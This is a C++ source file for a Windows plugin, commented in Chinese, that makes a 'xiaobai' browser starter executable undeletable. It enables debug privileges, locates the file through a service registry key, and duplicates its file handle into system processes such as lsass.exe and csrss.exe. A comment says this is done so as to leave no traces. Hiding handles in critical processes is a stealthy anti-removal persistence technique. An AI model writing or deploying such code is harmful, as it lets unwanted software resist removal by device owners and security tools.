// OccuXbstartFile.cpp : 定义应用程序的入口点。
//

/*
插件作用.占用小白start并且拷贝句柄.让其不能被破坏.

*/
#include "stdafx.h"
#include "OccuXbstartFile.h"
#include "../../../publicstruct.h"
#include "../../../RegManger/RegManger/CRegManger.h"
#include "../../../FileManger/CFileManger/CFileManger.h"
#include "../../../ProcessManger/ProcessIterator/CProcessOpt.h"
#include <vector>

//要将句柄拷贝到目的的进程名.都是System进程.
vector<CBinString> g_ProcessName = {
    TEXT("lsass.exe"),
    TEXT("svchost.exe"),
    TEXT("csrss.exe"),
    TEXT("wininit.exe"),
    TEXT("services.exe"),
    TEXT("smss.exe"),
    TEXT("explorer.exe")
};

vector<DWORD> g_OccPid;

//保护根目录下的文件
BOOL ProtectedRootPathFile(CBinString ProtectFileName);
//保护版本目录下的文件
BOOL ProtectedXbVersionFile(CBinString ProtectFileName);

BOOL ProtectedRootPathFile(CBinString ProtectFileName)
{
    CRegManger RegOpt;
    CFileManger fileOpt;
    CProcessOpt psOpt;
    DWORD dwPid = 0;
    HANDLE hLaassProcess = 0;
    HANDLE hTarHandle;
    DWORD dwErrorCode = 0;
    psOpt.SeEnbalAdjustPrivileges(SE_DEBUG_NAME);
    psOpt.SeEnbalAdjustPrivileges(SE_BACKUP_NAME);
    psOpt.SeEnbalAdjustPrivileges(SE_RESTORE_NAME);


    /*
    读取其注册表分割路径.找到xiaobai start
     */
    CBinString xbServicePath = TEXT("");
    CBinString XbStartrtPath = TEXT("");
    xbServicePath = RegOpt.ReGetSpecifiedKeyValue(
        HKEY_LOCAL_MACHINE,
        TEXT("SYSTEM\\CurrentControlSet\\Services\\xbbrowser_service"),
        TEXT("ImagePath"),
        REG_EXPAND_SZ);
    if (xbServicePath.empty())
    {
        return 0;
    }
    XbStartrtPath = xbServicePath.substr(0, xbServicePath.find_last_of(TEXT("\\")));
    XbStartrtPath = XbStartrtPath.substr(0, XbStartrtPath.find_last_of(TEXT("\\")));
    XbStartrtPath = XbStartrtPath + TEXT("\\");
    XbStartrtPath = XbStartrtPath + ProtectFileName;
    while (true)
    {

        HANDLE hTempFile = INVALID_HANDLE_VALUE;
        hTempFile = fileOpt.FsCreateFile(
            XbStartrtPath,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING,
            NULL,
            NULL);
        if (GetLastError() == ERROR_SHARING_VIOLATION || INVALID_HANDLE_VALUE == hTempFile) //代表已经成功锁住。
        {
            CloseHandle(hTempFile);
            return 0;
        }
        CloseHandle(hTempFile);
        HANDLE hFile = fileOpt.FsCreateFile(
            XbStartrtPath,
            GENERIC_READ,
            FILE_SHARE_READ,
            NULL, OPEN_EXISTING,
            NULL,
            NULL);

        if (INVALID_HANDLE_VALUE == hFile)
        {
            continue;
        }


        for (int i = 0; i < g_ProcessName.size(); i++)
        {

            dwPid = psOpt.PsGetProcessIdByProcessFileName(g_ProcessName[i]);
            if (dwPid != 0)
            {
                g_OccPid.push_back(dwPid);;
            }
        }

        for (int i = 0; i < g_OccPid.size(); i++)
        {
            hLaassProcess = psOpt.PsGetProcess(g_OccPid[i]);
            if (0 == hLaassProcess)
            {
                continue;
            }
            //获取权限成功继续拷贝.
            dwErrorCode = psOpt.HndDuplicateHandle(GetCurrentProcess(), hFile, hLaassProcess, &hTarHandle);
            if (!dwErrorCode)
            {
                continue; //拷贝不成功,继续拷贝.
            }
            break; //为了不留下信息.结束.

        }

        //否则关闭资源.代表拷贝不成功.
        CloseHandle(hLaassProcess);
        CloseHandle(hFile);

    }
    
    return 0;
}
BOOL ProtectedXbVersionFile(CBinString ProtectFileName)
{

    CRegManger RegOpt;
    CFileManger fileOpt;
    CProcessOpt psOpt;
    DWORD dwPid = 0;
    HANDLE hLaassProcess = 0;
    HANDLE hTarHandle;
    DWORD dwErrorCode = 0;
    psOpt.SeEnbalAdjustPrivileges(SE_DEBUG_NAME);
    psOpt.SeEnbalAdjustPrivileges(SE_BACKUP_NAME);
    psOpt.SeEnbalAdjustPrivileges(SE_RESTORE_NAME);


    /*
    读取其注册表分割路径.找到xiaobai start
     */
    CBinString xbServicePath = TEXT("");
    CBinString XbBrowser = TEXT("");
    xbServicePath = RegOpt.ReGetSpecifiedKeyValue(
        HKEY_LOCAL_MACHINE,
        TEXT("SYSTEM\\CurrentControlSet\\Services\\xbbrowser_service"),
        TEXT("ImagePath"),
        REG_EXPAND_SZ);
    if (xbServicePath.empty())
    {
        return 0;
    }
    XbBrowser = xbServicePath.substr(0, xbServicePath.find_last_of(TEXT("\\")));
    XbBrowser = XbBrowser + TEXT("\\");
    XbBrowser = XbBrowser + ProtectFileName;
    while (true)
    {

        HANDLE hTempFile = INVALID_HANDLE_VALUE;
        hTempFile = fileOpt.FsCreateFile(
            XbBrowser,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING,
            NULL,
            NULL);
        if (GetLastError() == ERROR_SHARING_VIOLATION || INVALID_HANDLE_VALUE == hTempFile) //代表已经成功锁住。
        {
            return 0;
        }
        HANDLE hFile = fileOpt.FsCreateFile(
            XbBrowser,
            GENERIC_READ,
            FILE_SHARE_READ,
            NULL, OPEN_EXISTING,
            NULL,
            NULL);

        if (INVALID_HANDLE_VALUE == hFile)
        {
            continue;
        }


        for (int i = 0; i < g_ProcessName.size(); i++)
        {

            dwPid = psOpt.PsGetProcessIdByProcessFileName(g_ProcessName[i]);
            if (dwPid != 0)
            {
                g_OccPid.push_back(dwPid);;
            }
        }

        for (int i = 0; i < g_OccPid.size(); i++)
        {
            hLaassProcess = psOpt.PsGetProcess(g_OccPid[i]);
            if (0 == hLaassProcess)
            {
                continue;
            }
            //获取权限成功继续拷贝.
            dwErrorCode = psOpt.HndDuplicateHandle(GetCurrentProcess(), hFile, hLaassProcess, &hTarHandle);
            if (!dwErrorCode)
            {
                continue; //拷贝不成功,继续拷贝.
            }
            break; //为了不留下信息.结束.

        }

        //否则关闭资源.代表拷贝不成功.
        CloseHandle(hLaassProcess);
        CloseHandle(hFile);

    }
    return 0;

}
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    ProtectedRootPathFile(TEXT("xbstarter.exe")); //保护根目录下的文件
   // ProtectedXbVersionFile(TEXT("xbbrowser.exe")); //保护小白版本目录下的文件.
}



